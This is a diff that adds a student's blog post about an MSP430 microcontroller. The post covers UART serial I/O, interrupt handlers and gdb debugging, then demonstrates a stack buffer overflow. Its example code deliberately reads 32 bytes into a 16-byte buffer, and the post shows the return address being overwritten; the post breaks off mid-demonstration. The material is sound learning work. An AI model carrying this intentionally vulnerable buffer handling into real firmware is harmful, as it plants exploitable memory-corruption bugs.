@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script>
+<script type="text/javascript">
+window.MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']]
+  },
+  chtml: {
+    scale: 1.10   /* Increase font size: 1.0 = default, 1.5 = 150% */
+  }
+};
+</script>
+  <title>msp430 pwn</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="msp430 pwn" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="recommended listening for this post is kawasaki backflip by dogleg." />
+<meta property="og:description" content="recommended listening for this post is kawasaki backflip by dogleg." />
+<link rel="canonical" href="http://localhost:4000/2026/01/11/msp430-pwn.html" />
+<meta property="og:url" content="http://localhost:4000/2026/01/11/msp430-pwn.html" />
+<meta property="og:site_name" content="wrenches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-01-11T05:40:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="msp430 pwn" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-01-11T05:40:00+08:00","datePublished":"2026-01-11T05:40:00+08:00","description":"recommended listening for this post is kawasaki backflip by dogleg.","headline":"msp430 pwn","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2026/01/11/msp430-pwn.html"},"url":"http://localhost:4000/2026/01/11/msp430-pwn.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wrenches" /><link rel="shortcut icon" type="image/x-icon" href="" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+
+</head>
+<body a="dark">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/"></a><article>
+  <p class="post-meta">
+    <time datetime="2026-01-11 05:40:00 +0800">2026-01-11 05:40:00 +0800</time>
+  </p>
+  
+  <h1>msp430 pwn</h1>
+
+  <p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=zjjygwmqG9M">kawasaki backflip</a> by dogleg.</p>
+
+<p><img src="https://i.imgur.com/xxR6MHc.png" alt="https://i.imgur.com/xxR6MHc.png" />
+so for my first year of uni they gave us access to an msp430 board and i was naturally very curious as to what you could do with it, here r my findings after a little bit of experimentation. during my trimester proper i couldn’t properly figure out how to get serial communications working*, but now in my second trimester i am wiser and cooler and i have figured that out - and naturally, serial comms -&gt; input/output -&gt; … pwn … ?</p>
+
+<p>*<em>i ended up writing a reversing challenge based on the msp430 architecture but i wasnt happy with it given that theres no actual user input. how can you have a flagchecker if you have no flag to check!!</em></p>
+
+<p>a few things: i used my friend’s <a href="github.com/TemariVirus/msp430-nix-env">nix flake</a> to set everything up, there are differences in the C syntax (for ISRs specifically) depending on whether or not you use GCC or CCS (code composer studio) to compile your binaries. i will be using GCC in this writeup because i am more familiar with it and i prefer it.</p>
+
+<h3 id="serial-comms">serial comms</h3>
+
+<p>the msp430 is a microcontroller. the important thing about the msp430 is that most of its peripherals use memory-mapped IO, in that you can control, read, write from the various peripherals the device has to offer just by accessing memory that the main CPU already has access to.</p>
+
+<p>the peripherals include stuff like timers, LEDs, n most importantly, UART (universal asynchronous receiver-transmitter) :) this is what we’ll be using to actually communicate with the msp430 just by typing in stuff.</p>
+
+<p>a lot of setup needs to be performed before we can actually get UART up n running:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">initialize_uart</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">WDTCTL</span> <span class="o">=</span> <span class="n">WDTPW</span> <span class="o">+</span> <span class="n">WDTHOLD</span><span class="p">;</span> <span class="c1">// set watchdog</span>
+
+  <span class="n">P4SEL</span> <span class="o">|=</span> <span class="n">BIT4</span> <span class="o">+</span> <span class="n">BIT5</span><span class="p">;</span> <span class="c1">// setup pins for UART (P4.4 is transmit, P4.5 is receive)</span>
+
+  <span class="n">UCA1CTL1</span> <span class="o">|=</span> <span class="n">UCSWRST</span><span class="p">;</span> <span class="c1">// configure UART, first we place USCI in reset</span>
+  <span class="n">UCA1CTL1</span> <span class="o">|=</span> <span class="n">UCSSEL_2</span><span class="p">;</span> <span class="c1">// use SMCLK - the MSP430 has 3 diff clock sources, we use this one (1.048MHz)</span>
+
+  <span class="n">UCA1BR0</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span> <span class="c1">// we calculate the BAUD rate, lower byte is BR0, top byte is BR1. 1.048Mhz / 9600 = 109.2</span>
+  <span class="n">UCA1BR1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// the number fits inside one byte so we just clear it out</span>
+  <span class="n">UCA1MCTL</span> <span class="o">|=</span> <span class="n">UCBRS_2</span><span class="p">;</span> <span class="c1">// modulation, because 1.048hmhz is not divisible into 9600 we set this modulation bit</span>
+
+  <span class="n">UCA1CTL1</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">UCSWRST</span><span class="p">;</span> <span class="c1">// now we can initialize it</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>i have helpfully commented the above code but some additional notes:</p>
+
+<ul>
+  <li>
+    <p>we need to configure the pins for receiving + transmitting, and the default pin used for that, according to the <a href="https://www.ti.com/lit/ds/symlink/msp430f5529.pdf">spec</a>, are P4.4 and P4.5. <img src="https://i.imgur.com/iXz8BAJ.png" alt="pdf" /> however, they are not actually configured for UART functionality <em>by default</em>, hence we need to P4SEL such that they are specifically used for UART. <img src="https://i.imgur.com/LO0qmts.png" alt="secondary" /> note that their ‘mapped secondary digital function’ is the functionality shown in the above table.</p>
+  </li>
+  <li>
+    <p>we operate on 9600 baud. we do this by setting the USCI module to use the 1.048mhz clock on the msp430, then further dividing that down. <img src="https://i.imgur.com/Mlfa4f2.png" alt="baudrate" /> note the registers we use in the code above, and what they correspond to here.</p>
+  </li>
+</ul>
+
+<p>after all of this nonsense, we can get UART setup!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;msp430.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">initialize_uart</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">WDTCTL</span> <span class="o">=</span> <span class="n">WDTPW</span> <span class="o">+</span> <span class="n">WDTHOLD</span><span class="p">;</span> <span class="c1">// set watchdog</span>
+  
+  <span class="n">P4SEL</span> <span class="o">|=</span> <span class="n">BIT4</span> <span class="o">+</span> <span class="n">BIT5</span><span class="p">;</span> <span class="c1">// setup pins for UART (P4.4 is transmit, P4.5 is receive)</span>
+
+  <span class="n">UCA1CTL1</span> <span class="o">|=</span> <span class="n">UCSWRST</span><span class="p">;</span> <span class="c1">// configure UART, first we place USCI in reset</span>
+  <span class="n">UCA1CTL1</span> <span class="o">|=</span> <span class="n">UCSSEL_2</span><span class="p">;</span> <span class="c1">// use SMCLK - the MSP430 has 3 diff clock sources, we use this one (1.048MHz)</span>
+
+  <span class="n">UCA1BR0</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span> <span class="c1">// we calculate the BAUD rate, lower byte is BR0, top byte is BR1. 1.048Mhz / 9600 = 109.2</span>
+  <span class="n">UCA1BR1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// the number fits inside one byte so we just clear it out</span>
+  <span class="n">UCA1MCTL</span> <span class="o">|=</span> <span class="n">UCBRS_2</span><span class="p">;</span> <span class="c1">// modulation, because 1.048hmhz is not divisible into 9600 we set this modulation bit</span>
+
+  <span class="n">UCA1CTL1</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">UCSWRST</span><span class="p">;</span> <span class="c1">// now we can initialize it</span>
+  <span class="n">UCA1IE</span> <span class="o">|=</span> <span class="n">UCRXIE</span><span class="p">;</span> <span class="c1">// enable RX interrupts, when the UART receives anything our interrupt will actly trigger</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">initialize_uart</span><span class="p">();</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"hello vro!</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">uart_write</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">UCA1IFG</span> <span class="o">&amp;</span> <span class="n">UCTXIFG</span><span class="p">));</span>
+    <span class="n">UCA1TXBUF</span> <span class="o">=</span> <span class="o">*</span><span class="n">str</span><span class="o">++</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>i’ve also written a handy <code class="language-plaintext highlighter-rouge">uart_write()</code> function that will iterate through each character, and set the value at the USCI transfer buffer <code class="language-plaintext highlighter-rouge">UCA1TXBUF</code> accordingly. if we start our serial listener, <em>then</em> flash+run the program, we can see our output:</p>
+
+<p><img src="https://i.imgur.com/JVvoagF.png" alt="wow" /></p>
+
+<p>the thing is, <code class="language-plaintext highlighter-rouge">uart_write</code> only triggers once every runtime. also, this doesn’t let us get any input from <code class="language-plaintext highlighter-rouge">UCA1RXBUF</code> at all! our next goal should be to write something that will pick up whenever we send a character, and then ‘mirror’ that character back into the serial console.</p>
+
+<p>we can do this with…</p>
+
+<h3 id="a-quick-detour-into-interrupt-service-routines-isrs">a quick detour into interrupt service routines (ISRs)</h3>
+
+<p>most peripherals on the MSP430 are based on interrupts instead of polling, enabling us to write functions that only trigger when the chip detects a character instead of polling it constantly.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">interrupt</span><span class="p">(</span><span class="n">USCI_A1_VECTOR</span><span class="p">)))</span> <span class="n">USCI_A1_ISR</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">UCA1IV</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">dummy</span> <span class="o">=</span> <span class="n">UCA1RXBUF</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">UCA1IFG</span> <span class="o">&amp;</span> <span class="n">UCTXIFG</span><span class="p">));</span>
+    <span class="n">UCA1TXBUF</span> <span class="o">=</span> <span class="n">dummy</span><span class="p">;</span>
+  <span class="p">}</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">UCA1IV</code> is the interrupt vector for USCI, a value of 2 means that there is a character waiting for us in the buffer if so, we save the character, then wait for the transmitter to be ready (hence that while loop), and then populate the transmission buffer with the saved character. this correctly enables our input to be reflected across the serial device:</p>
+
+<p><img src="https://i.imgur.com/Hi2Jtaf.png" alt="woohoo" /></p>
+
+<p>great! this is a nice way to save computing power by leveraging interrupt service routines.</p>
+
+<p>however, for the most part we will actually just be ‘polling’ the peripheral itself because this makes programming a lot easier xd</p>
+
+<h3 id="actually-doing-something-with-inputoutput">actually doing something with input/output</h3>
+
+<p>anyways now it’s time to reinvent <code class="language-plaintext highlighter-rouge">fgets()</code> from first principles - ideally, we want to be able to read characters from UART, then store them all into a buffer so that we can Actually Do Stuff with the input.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">uart_fgets</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">,</span> <span class="kt">int</span> <span class="n">max_size</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;</span> <span class="n">max_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">UCA1IFG</span> <span class="o">&amp;</span> <span class="n">UCRXIFG</span><span class="p">));</span> 
+    <span class="kt">char</span> <span class="n">inp</span> <span class="o">=</span> <span class="n">UCA1RXBUF</span><span class="p">;</span>
+
+    <span class="c1">// echo back</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">UCA1IFG</span> <span class="o">&amp;</span> <span class="n">UCTXIFG</span><span class="p">));</span>
+    <span class="n">UCA1TXBUF</span> <span class="o">=</span> <span class="n">inp</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">inp</span> <span class="o">==</span> <span class="sc">'\r'</span> <span class="o">||</span> <span class="n">inp</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">str</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+      <span class="n">uart_write</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="n">str</span><span class="p">[</span><span class="n">count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">inp</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">str</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>here is code to do exactly that! we just keep getting input until a predetermined <em>size</em> or a newline, storing it all into some buffer as we go along.</p>
+
+<p>we can plonk this into a loop:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">input_loop</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"--------</span><span class="se">\r\n</span><span class="s">enter input &gt; "</span><span class="p">);</span>
+  <span class="n">uart_fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"input entered &gt; "</span><span class="p">);</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>and then:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">initialize_uart</span><span class="p">();</span>
+  <span class="n">__bis_SR_register</span><span class="p">(</span><span class="n">GIE</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">input_loop</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>this will continually prompt us for input and just echo it back.</p>
+
+<p><img src="https://i.imgur.com/Egrc8pC.png" alt="meow" /></p>
+
+<p>nothing exciting so far, just basic i/o!</p>
+
+<h3 id="debugging-w-gdb">debugging w/ gdb</h3>
+
+<p>the utility i’m using, <code class="language-plaintext highlighter-rouge">mspdebug</code>, has built in gdb functionality w/ the <code class="language-plaintext highlighter-rouge">gdb</code> command, and the workflow is not entirely dissimilar to kernel pwn: you start the device, then start the debugger, then remotely attach the debugger to the device.</p>
+
+<p><img src="https://i.imgur.com/jFjr9xK.png" alt="gdb" /></p>
+
+<p>on the left i have <code class="language-plaintext highlighter-rouge">mspdebug</code>, and on the right i have the debugger. <code class="language-plaintext highlighter-rouge">gdb</code> is a lot more comfortable for me, and we can see various cool things, such as variable names:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">variables</span>
+<span class="n">All</span> <span class="n">defined</span> <span class="n">variables</span><span class="o">:</span>
+
+<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span> <span class="n">symbols</span><span class="o">:</span>
+<span class="mh">0x00002400</span>  <span class="n">__heap_start__</span>
+<span class="mh">0x00002400</span>  <span class="n">_edata</span>
+<span class="mh">0x00002400</span>  <span class="n">_end</span>
+<span class="mh">0x00002404</span>  <span class="n">__HeapLimit</span>
+<span class="mh">0x00002404</span>  <span class="n">__heap_end__</span>
+<span class="mh">0x00004400</span>  <span class="n">__stack</span>
+<span class="mh">0x0000fffe</span>  <span class="n">__msp430_resetvec_hook</span>
+</code></pre></div></div>
+
+<p>as well as disassembly for certain functions we may find interesting</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disass</span> <span class="n">main</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
+   <span class="mh">0x000045cc</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">call</span>	<span class="err">#</span><span class="mi">17630</span>		<span class="p">;</span><span class="err">#</span><span class="mh">0x44de</span>
+   <span class="mh">0x000045d0</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="n">nop</span>			
+   <span class="mh">0x000045d2</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">eint</span>			
+   <span class="mh">0x000045d4</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="n">nop</span>			
+   <span class="mh">0x000045d6</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="n">call</span>	<span class="err">#</span><span class="mi">17692</span>		<span class="p">;</span><span class="err">#</span><span class="mh">0x451c</span>
+   <span class="mh">0x000045da</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="n">call</span>	<span class="err">#</span><span class="mi">17692</span>		<span class="p">;</span><span class="err">#</span><span class="mh">0x451c</span>
+   <span class="mh">0x000045de</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span>	<span class="n">jmp</span>	<span class="err">$</span><span class="o">-</span><span class="mi">8</span>      	<span class="p">;</span><span class="n">abs</span> <span class="mh">0x45d6</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>as well as register values during runtime!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">registers</span>
+<span class="n">pc</span>             <span class="mh">0x446c</span>              <span class="mh">0x446c</span> <span class="o">&lt;</span><span class="n">uart_fgets</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
+<span class="n">sp</span>             <span class="mh">0x43ea</span>              <span class="mi">17386</span>
+<span class="n">sr</span>             <span class="mh">0xa</span>                 <span class="mi">10</span>
+<span class="n">cg</span>             <span class="mh">0x0</span>                 <span class="mi">0</span>
+<span class="n">r4</span>             <span class="mh">0xfffff</span>             <span class="mi">1048575</span>
+<span class="n">r5</span>             <span class="mh">0x4444</span>              <span class="mi">17476</span>
+<span class="n">r6</span>             <span class="mh">0xe0</span>                <span class="mi">224</span>
+<span class="n">r7</span>             <span class="mh">0x6ec0</span>              <span class="mi">28352</span>
+<span class="n">r8</span>             <span class="mh">0xa508</span>              <span class="mi">42248</span>
+<span class="n">r9</span>             <span class="mh">0x0</span>                 <span class="mi">0</span>
+<span class="n">r10</span>            <span class="mh">0x2d</span>                <span class="mi">45</span>
+<span class="n">r11</span>            <span class="mh">0x0</span>                 <span class="mi">0</span>
+<span class="n">r12</span>            <span class="mh">0x43ec</span>              <span class="mi">17388</span>
+<span class="n">r13</span>            <span class="mh">0x1f</span>                <span class="mi">31</span>
+<span class="n">r14</span>            <span class="mh">0x0</span>                 <span class="mi">0</span>
+<span class="n">r15</span>            <span class="mh">0x3</span>                 <span class="mi">3</span>
+</code></pre></div></div>
+
+<p>(<code class="language-plaintext highlighter-rouge">pc</code> is the program counter, or the msp430 equivalent of RIP, and <code class="language-plaintext highlighter-rouge">sp</code> is the stack pointer). we can place some breakpoints at our <code class="language-plaintext highlighter-rouge">input_loop</code> function and see the contents of the stack, as well:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000045c6</span> <span class="n">in</span> <span class="n">input_loop</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="n">sp</span>
+<span class="n">No</span> <span class="n">symbol</span> <span class="n">table</span> <span class="n">is</span> <span class="n">loaded</span><span class="p">.</span>  <span class="n">Use</span> <span class="n">the</span> <span class="s">"file"</span> <span class="n">command</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="err">$</span><span class="n">sp</span>
+<span class="mh">0x43ec</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>
+<span class="mh">0x43fc</span><span class="o">:</span>	<span class="mh">0x444645da</span>	<span class="mh">0x2d000a0d</span>	<span class="mh">0x2d2d2d2d</span>	<span class="mh">0x0d2d2d2d</span>
+</code></pre></div></div>
+
+<p>note that the top half is all nulled out, this is because we have allocated that to be a zeroed-out <code class="language-plaintext highlighter-rouge">buf</code> var. we can also see the return address, <code class="language-plaintext highlighter-rouge">0x45da</code>, directly <em>after</em> the <code class="language-plaintext highlighter-rouge">buf</code> var.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">bt</span>
+<span class="cp">#0  0x000045c6 in input_loop ()
+#1  0x000045da in main ()
+</span></code></pre></div></div>
+
+<p>continuing just before the ret instruction:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000045c6</span> <span class="n">in</span> <span class="n">input_loop</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">i</span> <span class="err">$</span><span class="n">pc</span>
+<span class="o">=&gt;</span> <span class="mh">0x45c6</span> <span class="o">&lt;</span><span class="n">input_loop</span><span class="o">+</span><span class="mi">170</span><span class="o">&gt;:</span>	
+    <span class="n">add</span>	<span class="err">#</span><span class="mi">16</span><span class="p">,</span>	<span class="n">r1</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x0010</span>
+   <span class="mh">0x45ca</span> <span class="o">&lt;</span><span class="n">input_loop</span><span class="o">+</span><span class="mi">174</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+</code></pre></div></div>
+
+<p>we can see that the ‘stack’ cleanup here is to increment the stack pointer by 0x10 (as that’s the size of our <code class="language-plaintext highlighter-rouge">buf</code>), and to <code class="language-plaintext highlighter-rouge">ret</code> by popping the next value off of the stack and jumping to it. this should be quite familiar if you’re familiar with pwn on more conventional platforms (i.e. x86).</p>
+
+<p>therefore this should lead us to…</p>
+
+<h3 id="buffer-overflow">buffer overflow</h3>
+
+<p>say we <code class="language-plaintext highlighter-rouge">fgets()</code> with the wrong size:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">input_loop</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"--------</span><span class="se">\r\n</span><span class="s">enter input &gt; "</span><span class="p">);</span>
+  <span class="n">uart_fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"input entered &gt; "</span><span class="p">);</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span> 
+<span class="p">}</span>
+
+<span class="c1">// let's also include a win() func</span>
+<span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">uart_write</span><span class="p">(</span><span class="s">"you're winner!"</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>by right, since the return address is exactly below the buffer on the stack, if we have an overflow we should be able to overflow into the return address and gain control of PC.</p>
+
+<p>let’s simulate that:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000045c6</span> <span class="n">in</span> <span class="n">input_loop</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="err">$</span><span class="n">sp</span>
+<span class="mh">0x43ec</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>
+<span class="mh">0x43fc</span><span class="o">:</span>	<span class="mh">0x444645da</span>	<span class="mh">0x2d000a0d</span>	<span class="mh">0x2d2d2d2d</span>	<span class="mh">0x0d2d2d2d</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">bt</span>
+<span class="cp">#0  0x000045c6 in input_loop ()
+#1  0x000045da in main ()
+</span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000045c6</span> <span class="n">in</span> <span class="n">input_loop</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="err">$</span><span class="n">sp</span>
+<span class="mh">0x43ec</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>
+<span class="mh">0x43fc</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x2d000a0d</span>	<span class="mh">0x2d2d2d2d</span>	<span class="mh">0x0d2d2d2d</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>see how the initial return address, <code class="language-plaintext highlighter-rouge">0x45da</code>, is now overwritten with <code class="language-plaintext highlighter-rouge">0x4141</code>, and indeed, if we step through it manually, we will see that the program will attempt to jump to <code class="language-plaintext highlighter-rouge">0x4141</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000045c6</span> <span class="n">in</span> <span class="n">input_loop</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="err">$</span><span class="n">sp</span>
+<span class="mh">0x43ec</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>
